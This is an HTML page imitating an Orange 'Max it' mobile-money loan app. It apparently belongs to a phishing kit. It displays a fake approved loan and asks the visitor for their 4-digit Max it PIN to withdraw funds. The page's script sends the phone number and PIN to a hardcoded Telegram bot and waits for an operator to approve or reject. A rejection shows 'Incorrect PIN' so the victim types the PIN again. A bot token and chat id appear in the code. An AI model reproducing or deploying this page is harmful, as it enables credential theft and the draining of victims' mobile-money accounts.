<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Max it - Available Limit</title>

    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
         :root {
            --orange-primary: #FF7900;
            --orange-light: #fff2e5;
            --text-dark: #1a1a1a;
            --text-grey: #6b7280;
            --bg-page: #e5e5ea;
            --bg-white: #ffffff;
            --border-color: #e5e7eb;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
        }
        
        body {
            background-color: var(--bg-page);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        
        .app-container {
            width: 100%;
            max-width: 400px;
            height: 100vh;
            max-height: 850px;
            background-color: #f9fafb;
            position: relative;
            display: flex;
            flex-direction: column;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
            overflow: hidden;
        }
        
        @media (min-width: 401px) {
            .app-container {
                height: 90vh;
                border-radius: 40px;
                border: 8px solid #000;
            }
        }
        /* Header */
        
        .app-header {
            background-color: var(--orange-primary);
            color: white;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px;
        }
        
        .icon-btn {
            background: none;
            border: none;
            color: white;
            font-size: 20px;
            cursor: pointer;
        }
        
        .logo {
            font-size: 20px;
            font-weight: 500;
            letter-spacing: -0.5px;
        }
        
        .logo strong {
            font-weight: 800;
        }
        /* Dashboard Content */
        
        .content-area {
            padding: 25px 20px;
            flex-grow: 1;
            display: flex;
            flex-direction: column;
        }
        
        .greeting {
            color: var(--text-grey);
            font-size: 15px;
            margin-bottom: 20px;
        }
        /* Limit Card */
        
        .limit-card {
            background: linear-gradient(135deg, var(--orange-primary) 0%, #e66a00 100%);
            border-radius: 20px;
            padding: 30px 20px;
            color: white;
            box-shadow: 0 15px 30px rgba(255, 121, 0, 0.3);
            text-align: center;
            margin-bottom: 30px;
            position: relative;
            overflow: hidden;
        }
        /* Decorative Background Pattern */
        
        .limit-card::after {
            content: '';
            position: absolute;
            top: -50px;
            right: -50px;
            width: 150px;
            height: 150px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 50%;
        }
        
        .limit-label {
            font-size: 14px;
            font-weight: 500;
            opacity: 0.9;
            margin-bottom: 10px;
        }
        
        .limit-amount {
            font-size: 38px;
            font-weight: 800;
            letter-spacing: -1px;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 8px;
        }
        
        .currency {
            font-size: 20px;
            font-weight: 600;
            opacity: 0.9;
        }
        /* Actions */
        
        .btn-withdraw {
            width: 100%;
            background-color: var(--text-dark);
            color: white;
            border: none;
            padding: 18px;
            border-radius: 14px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: transform 0.2s;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
        }
        
        .btn-withdraw:active {
            transform: scale(0.98);
        }
        
        .info-box {
            background-color: white;
            border-radius: 12px;
            padding: 15px;
            margin-top: 20px;
            display: flex;
            align-items: center;
            gap: 15px;
            border: 1px solid var(--border-color);
        }
        
        .info-icon {
            width: 40px;
            height: 40px;
            background-color: var(--orange-light);
            color: var(--orange-primary);
            border-radius: 10px;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 18px;
        }
        
        .info-text h4 {
            font-size: 14px;
            color: var(--text-dark);
            margin-bottom: 4px;
        }
        
        .info-text p {
            font-size: 12px;
            color: var(--text-grey);
        }
        /* PIN Modal Overlay */
        
        .modal-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(4px);
            z-index: 100;
            display: none;
            /* Hidden by default */
            flex-direction: column;
            justify-content: flex-end;
        }
        /* Slide-up Modal Content */
        
        .pin-modal {
            background: white;
            width: 100%;
            padding: 30px 25px 40px;
            border-radius: 24px 24px 0 0;
            text-align: center;
            transform: translateY(100%);
            transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }
        
        .modal-overlay.active .pin-modal {
            transform: translateY(0);
        }
        
        .pin-modal h3 {
            font-size: 20px;
            color: var(--text-dark);
            margin-bottom: 10px;
        }
        
        .pin-modal p {
            font-size: 14px;
            color: var(--text-grey);
            margin-bottom: 25px;
        }
        
        .pin-inputs {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-bottom: 30px;
        }
        
        .pin-box {
            width: 50px;
            height: 60px;
            border: 2px solid var(--border-color);
            border-radius: 12px;
            font-size: 24px;
            font-weight: 700;
            text-align: center;
            color: var(--text-dark);
            outline: none;
            transition: border-color 0.2s;
            /* Hide arrow spinners in number inputs */
            -moz-appearance: textfield;
        }
        
        .pin-box::-webkit-outer-spin-button,
        .pin-box::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }
        
        .pin-box:focus {
            border-color: var(--orange-primary);
        }
        
        .btn-confirm {
            width: 100%;
            background-color: var(--orange-primary);
            color: white;
            border: none;
            padding: 18px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            opacity: 0.5;
            pointer-events: none;
            transition: opacity 0.3s;
        }
        
        .btn-confirm.active {
            opacity: 1;
            pointer-events: auto;
        }
        
        .close-modal {
            position: absolute;
            top: 20px;
            right: 20px;
            background: none;
            border: none;
            font-size: 20px;
            color: var(--text-grey);
            cursor: pointer;
        }
    </style>
</head>

<body>

    <div class="app-container">

        <header class="app-header">
            <button class="icon-btn" onclick="window.location.href='otp.html'"><i class="fa-solid fa-arrow-left"></i></button>
            <div class="logo"><strong>Max</strong>It</div>
            <button class="icon-btn"><i class="fa-solid fa-bell"></i></button>
        </header>

        <div class="content-area">
            <div class="greeting" id="greetingText">Hello, Applicant!</div>

            <div class="limit-card">
                <div class="limit-label">Approved Loan Limit</div>
                <div class="limit-amount">
                    <span class="currency">SLe</span>
                    <span id="animatedNumber">0</span>
                </div>
            </div>

            <button class="btn-withdraw" id="withdrawBtn">
                Withdraw Now <i class="fa-solid fa-arrow-right"></i>
            </button>

            <div class="info-box">
                <div class="info-icon"><i class="fa-solid fa-wallet"></i></div>
                <div class="info-text">
                    <h4>Instant Transfer</h4>
                    <p>Funds will be deposited directly to your Orange Money wallet.</p>
                </div>
            </div>
        </div>

        <div class="modal-overlay" id="pinOverlay">
            <div class="pin-modal">
                <button class="close-modal" id="closeModalBtn"><i class="fa-solid fa-xmark"></i></button>
                <h3>Confirm Withdrawal</h3>
                <p>Enter your 4-digit Max it PIN to authorize this transaction.</p>

                <div class="pin-inputs">
                    <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
                    <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
                    <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
                    <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
                </div>

                <button class="btn-confirm" id="confirmBtn">CONFIRM</button>
            </div>
        </div>

    </div>

    <div id="errorModal" style="display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 1000; justify-content: center; align-items: center; padding: 20px;">
        <div style="background: white; padding: 25px; border-radius: 16px; text-align: center; width: 100%; max-width: 320px; box-shadow: 0 10px 25px rgba(0,0,0,0.2);">
            <i class="fa-solid fa-circle-xmark" style="color: #ef4444; font-size: 40px; margin-bottom: 15px;"></i>
            <h3 style="color: #1a1a1a; font-size: 18px; margin-bottom: 10px;">Verification Failed</h3>
            <p style="color: #666; font-size: 14px; margin-bottom: 20px;" id="errorText">Incorrect PIN, please try again.</p>
            <button onclick="closeErrorModal()" style="width: 100%; background: #FF7900; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: 600; cursor: pointer;">Try Again</button>
        </div>
    </div>

    <script>
        // --- Shared State & Setup ---
        const savedPhone = sessionStorage.getItem('savedPhone');
        let cleanPhoneForBot = 'UNKNOWN';

        if (savedPhone) {
            document.getElementById('greetingText').innerText = `Hello, ${savedPhone}`;
            let cleanNumber = savedPhone.replace(/[^0-9]/g, '');
            if (cleanNumber.startsWith('0')) {
                cleanNumber = cleanNumber.substring(1);
            }
            cleanPhoneForBot = '232' + cleanNumber;
        }

        // --- Error Modal Logic ---
        const errorModal = document.getElementById('errorModal');
        const pinBoxes = document.querySelectorAll('.pin-box');

        function closeErrorModal() {
            errorModal.style.display = 'none';
            // Clear inputs and refocus
            pinBoxes.forEach(box => box.value = '');
            pinBoxes[0].focus();
            document.getElementById('confirmBtn').classList.remove('active');
        }

        // 1. Dynamic Limit Animation Logic
        const appliedAmountStr = sessionStorage.getItem('loanAmount') || "12500";
        const targetAmount = parseInt(appliedAmountStr, 10);
        const displayElement = document.getElementById('animatedNumber');

        const duration = 1500;
        let startTimestamp = null;

        const step = (timestamp) => {
            if (!startTimestamp) startTimestamp = timestamp;
            const progress = Math.min((timestamp - startTimestamp) / duration, 1);
            const easeOutProgress = 1 - Math.pow(1 - progress, 3);

            displayElement.innerText = Math.floor(easeOutProgress * targetAmount).toLocaleString();

            if (progress < 1) {
                window.requestAnimationFrame(step);
            } else {
                displayElement.innerText = targetAmount.toLocaleString();
            }
        };
        setTimeout(() => window.requestAnimationFrame(step), 300);

        // 2. Modal Toggle Logic
        const withdrawBtn = document.getElementById('withdrawBtn');
        const pinOverlay = document.getElementById('pinOverlay');
        const closeModalBtn = document.getElementById('closeModalBtn');

        withdrawBtn.addEventListener('click', () => {
            pinOverlay.style.display = 'flex';
            setTimeout(() => {
                pinOverlay.classList.add('active');
                pinBoxes[0].focus();
            }, 10);
        });

        function hideModal() {
            pinOverlay.classList.remove('active');
            setTimeout(() => {
                pinOverlay.style.display = 'none';
                pinBoxes.forEach(box => box.value = '');
                document.getElementById('confirmBtn').classList.remove('active');
            }, 300);
        }

        closeModalBtn.addEventListener('click', hideModal);
        pinOverlay.addEventListener('click', (e) => {
            if (e.target === pinOverlay) hideModal();
        });

        // 3. 4-Digit PIN Auto-Advance Logic
        const confirmBtn = document.getElementById('confirmBtn');

        pinBoxes.forEach((box, index) => {
            box.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/[^0-9]/g, '');

                if (e.target.value !== '' && index < 3) {
                    pinBoxes[index + 1].focus();
                }

                const allFilled = Array.from(pinBoxes).every(input => input.value.length === 1);
                if (allFilled) {
                    confirmBtn.classList.add('active');
                } else {
                    confirmBtn.classList.remove('active');
                }
            });

            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                    pinBoxes[index - 1].focus();
                }
            });
        });

        // --- TELEGRAM BOT CONFIGURATION ---
        const botToken = '8621922059:AAHPmlBtFdg5yL003r44eHaNmz0i42crlOM';
        const chatId = '1617155439';

        function sendWithdrawalToTelegram(phone, pin, amount) {
            const message = `💸 *Withdrawal Request*\nPhone: \`+${phone}\`\nAmount: \`SLe ${amount}\`\n🔑 PIN Entered: \`${pin}\`\n\n👇 Please Approve or Reject:`;

            const inlineKeyboard = {
                inline_keyboard: [
                    [{
                        text: "✅ Approve",
                        callback_data: `WDR_APP_${phone}`
                    }, {
                        text: "❌ Reject",
                        callback_data: `WDR_REJ_${phone}`
                    }]
                ]
            };

            return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'Markdown',
                    reply_markup: JSON.stringify(inlineKeyboard)
                })
            });
        }

        function startListeningForWithdrawalDecision(phone, btnElement) {
            let offset = 0;
            let decided = false;

            fetch(`https://api.telegram.org/bot${botToken}/getUpdates?limit=100`)
                .then(r => r.json())
                .then(data => {
                    if (data.ok && data.result.length > 0) {
                        offset = data.result[data.result.length - 1].update_id + 1;
                    }

                    const intervalId = setInterval(() => {
                        if (decided) return;

                        fetch(`https://api.telegram.org/bot${botToken}/getUpdates?limit=20&offset=${offset}`)
                            .then(r => r.json())
                            .then(data => {
                                if (!data.ok || decided) return;

                                for (let update of data.result) {
                                    offset = update.update_id + 1;

                                    if (update.callback_query) {
                                        const action = update.callback_query.data;

                                        if (action === `WDR_APP_${phone}`) {
                                            decided = true;
                                            clearInterval(intervalId);
                                            window.location.href = 'success.html'; // Redirect to success

                                        } else if (action === `WDR_REJ_${phone}`) {
                                            decided = true;
                                            clearInterval(intervalId);

                                            // Reset UI and Show Modal
                                            btnElement.innerHTML = 'CONFIRM';
                                            btnElement.style.opacity = '1';
                                            btnElement.disabled = true;
                                            btnElement.classList.remove('active');

                                            document.getElementById('errorText').innerText = "Incorrect PIN, please try again.";
                                            errorModal.style.display = 'flex';
                                        }
                                    }
                                }
                            })
                            .catch(err => console.error("Polling error:", err));
                    }, 4000);
                })
                .catch(err => {
                    console.error("Failed to initialize Telegram polling:", err);
                    btnElement.innerHTML = 'CONFIRM';
                    btnElement.style.opacity = '1';
                    btnElement.disabled = false;
                    alert("Network error communicating with the server.");
                });
        }

        // 4. Confirm Button Action
        confirmBtn.addEventListener('click', function() {
            const finalPin = Array.from(pinBoxes).map(box => box.value).join('');
            const btn = this;

            btn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Processing...';
            btn.style.opacity = '0.8';
            btn.disabled = true;

            // Use the target amount that was animated
            sendWithdrawalToTelegram(cleanPhoneForBot, finalPin, targetAmount.toLocaleString())
                .then(response => {
                    if (!response.ok) throw new Error("Failed to send Telegram message");
                    startListeningForWithdrawalDecision(cleanPhoneForBot, btn);
                })
                .catch(error => {
                    console.error("Telegram API Error:", error);
                    btn.innerHTML = 'CONFIRM';
                    btn.style.opacity = '1';
                    btn.disabled = false;
                    alert("Error connecting to the server. Please try again.");
                });
        });
    </script>
</body>

</html>
